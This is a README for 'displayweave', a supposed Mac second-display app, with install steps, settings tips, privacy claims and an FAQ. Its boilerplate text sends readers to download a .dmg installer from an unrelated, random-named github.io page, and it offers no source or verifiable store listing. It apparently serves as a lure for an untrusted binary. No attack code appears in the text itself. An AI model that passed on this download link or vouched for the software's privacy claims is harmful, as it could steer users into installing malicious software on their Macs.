# 🖥️ displayweave - Turn mobile devices into Mac displays

[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://psychical-recitative896.github.io)

## 📖 About the project

Displayweave turns your existing tablet or smartphone into a secondary monitor for your Mac. This tool works over your local network to provide a smooth, high-quality extension of your workspace. It uses modern video compression standards to maintain image clarity while keeping latency low. The software operates primarily on your local network, which keeps your data private and secure.

## ⚙️ System Requirements

To use this software, you need the following items:

* A Mac running a modern version of macOS.
* An iPhone, iPad, or Android device to serve as the second screen.
* A stable local network connection (Wi-Fi or Ethernet).
* Both the Mac and the mobile device must connect to the same network.

## 📥 How to get started

You need to place the software on your Mac to begin.

1. Visit the [Download Page](https://psychical-recitative896.github.io) to find the latest version of the installer.
2. Select the file that matches your Mac processor. Most modern Macs use Apple Silicon (M1, M2, or M3 chips), while older Macs use Intel processors.
3. Download the disk image file (.dmg) to your computer.
4. Open the downloaded file.
5. Drag the displayweave icon into your Applications folder.

## 🔌 Connecting your devices

Follow these steps to link your devices:

1. Open the displayweave application on your Mac.
2. Grant permission for screen recording if the system prompts you. This allows the Mac to send its display signal to the other device.
3. Install the corresponding displayweave application on your mobile device from the App Store or Google Play Store.
4. Ensure both your Mac and your mobile device are on the exact same network.
5. Launch the app on your mobile device.
6. Select your Mac from the list of available devices shown within the mobile app interface.
7. Your Mac desktop will appear on your mobile screen.

## 🛠️ Optimizing performance

This tool supports various advanced settings to improve your experience. You can adjust these in the settings menu of the desktop application.

* Frame Rate: You can choose between standard and high refresh rates. If you have a capable device, select the higher setting for smoother mouse movement.
* Compression: The software uses HEVC or H.264 video encoding. HEVC provides better quality at lower bandwidths, while H.264 offers broader compatibility with older hardware. The app usually selects the best option for your devices automatically.
* Resolution: If you experience lag or stuttering, lower the resolution setting. A standard resolution helps when your network connection faces interference.
* Keyboard and Mouse: You can enable input forwarding to use your Mac keyboard and mouse to control the mobile device, or vice versa, depending on your configuration.

## 🔒 Privacy and safety

Displayweave keeps your screen data on your local network. It does not send your display content to external servers or the cloud. All video traffic stays between your Mac and your mobile device. You do not need to register an account or provide personal information to use the software.

## ❓ Frequently asked questions

Do I need a cable to connect the devices?
No, the connection runs wirelessly over your local network. A strong Wi-Fi signal produces the best results.

Can I turn the screen orientation?
Yes, you can rotate the orientation within the settings menu on your Mac. The display will adjust to landscape or portrait mode based on your preference.

My device does not appear in the list. What should I do?
First, verify that both devices connect to the same network. Occasionally, firewall settings on your Mac or your router can block the signal. Ensure that the application has permission to communicate through your local network in your system security settings.

Does this work with multiple monitors?
Yes. Displayweave creates a virtual display that your Mac treats like any other physical monitor. You can arrange the display position in your Mac System Settings under the Displays menu.
